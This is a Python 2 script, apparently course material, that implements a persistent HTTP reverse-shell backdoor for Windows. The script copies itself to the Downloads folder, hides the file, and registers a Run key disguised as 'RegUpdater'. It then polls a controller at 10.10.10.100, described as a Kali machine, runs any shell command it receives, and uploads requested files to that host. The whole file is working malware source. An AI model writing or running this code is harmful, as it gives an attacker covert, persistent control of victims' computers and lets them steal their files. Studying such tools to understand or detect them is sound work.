# persistance feature like we did in Wraup up - Making a Persistant HTTP Reverse shell
#so without copying tcp.exe file


import os
import shutil
import subprocess
import _winreg as wreg

import requests 
import time




#Reconn Phase

#similar to putty.exe , but here we gonna copy ourselves to doc folder

path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Downloads\\'  +'cpreverse.exe'

#hidden tcpclient.exe file
subprocess.check_call(["attrib","+H","cpreverse.exe"])

#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 

if not os.path.exists(destination):  

    shutil.copyfile(path+'\cpreverse.exe', destination)#You can replace   path+'\tcpreverse.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
                                                         # and we will get the same result
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()


#Last phase is to start a reverse connection back to our kali machine

while True: 

    req = requests.get('http://10.10.10.100')
    command = req.text
        
    if 'terminate' in command:
        break 

    elif 'grab' in command:
        
        grab,path=command.split('*')
        if os.path.exists(path):
            url = 'http://10.10.10.100/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://10.10.10.100', data=
                                          '[-] Not able to find the file !' )
            
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )

    time.sleep(3)










